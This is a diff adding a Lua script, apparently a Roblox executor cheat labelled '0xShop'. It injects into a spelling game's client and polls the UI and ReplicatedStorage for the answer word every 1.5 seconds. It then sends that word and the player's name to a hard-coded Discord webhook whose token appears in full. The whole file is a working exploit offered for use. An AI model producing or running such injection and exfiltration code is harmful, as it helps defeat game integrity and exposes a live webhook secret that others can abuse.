@@ -1,0 +1,94 @@
+-- 直接在 Roblox 遊戲用戶端注入執行的腳本
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1509923254184185930/frNMjlxr7ZtWF_HPuXq1KpN3ush9aZVFBRp5dSBdcpvZ4m2QI0p7aRhv98p7bvxO6dFw"
+local lastDetectedWord = ""
+
+-- 判定是否為拼字遊戲目標單字
+local function isPotentialWord(str)
+	if not str or type(str) ~= "string" then return false end
+	str = string.gsub(str, "^%s*(.-)%s*$", "%1") -- 去除前後空白
+	if str == "Label" or str == "Text" or #str <= 1 then return false end
+	return string.match(str, "%a+")
+end
+
+-- 發送資料到 Discord 的函數（相容主流注入工具）
+local function sendToDiscord(word, sourceLocation)
+	if word == lastDetectedWord then return end
+	lastDetectedWord = word
+
+	-- 封裝 Discord Embed 訊息
+	local httpService = game:GetService("HttpService")
+	local embedData = {
+		["embeds"] = {{
+			["title"] = "📝 0x商城拼字遊戲 - 遊戲內實時抓取",
+			["color"] = 16711935, -- 粉色/紫色系
+			["fields"] = {
+				{["name"] = "🎯 偵測到單字", ["value"] = "`" .. word .. "`", ["inline"] = true},
+				{["name"] = "👤 帳號名稱", ["value"] = localPlayer.Name, ["inline"] = true},
+				{["name"] = "📍 數據來源", ["value"] = sourceLocation, ["inline"] = false}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}}
+	}
+
+	-- 轉換為 JSON
+	local jsonPayload = httpService:JSONEncode(embedData)
+
+	-- 使用外部工具通用的 Http 請求函數 (request / syn.request / http_request)
+	local sendRequest = request or http_request or (syn and syn.request)
+	
+	if sendRequest then
+		task.spawn(function()
+			local response = sendRequest({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = jsonPayload
+			})
+			print("0xShop: Webhook 已發送，狀態碼: " .. tostring(response.StatusCode))
+		end)
+	else
+		warn("0xShop: 錯誤！你的工具不支援 request 函數，無法直接發送外網請求。")
+	end
+end
+
+-- 地毯式雷達掃描核心
+local function scanForCurrentWord()
+	-- 1. 優先掃描所有 UI
+	for _, gui in ipairs(playerGui:GetChildren()) do
+		if gui:IsA("ScreenGui") then
+			for _, desc in ipairs(gui:GetDescendants()) do
+				if desc:IsA("TextLabel") or desc:IsA("TextBox") or desc:IsA("TextButton") then
+					local text = desc.Text
+					if isPotentialWord(text) then
+						sendToDiscord(text, "UI 屬性: " .. gui.Name .. "." .. desc.Name)
+						return
+					end
+				end
+			end
+		end
+	end
+	
+	-- 2. 次要掃描 ReplicatedStorage 共享區
+	for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
+		if desc:IsA("StringValue") and isPotentialWord(desc.Value) then
+			sendToDiscord(desc.Value, "ReplicatedStorage 路徑: " .. desc:GetFullName())
+			return
+		end
+	end
+end
+
+-- 每 1.5 秒自動背景掃描
+task.spawn(function()
+	print("🚀 0x商城 - 遊戲內 Webhook 監測雷達已啟動！")
+	while true do
+		scanForCurrentWord()
+		task.wait(1.5)
+	end
+end)
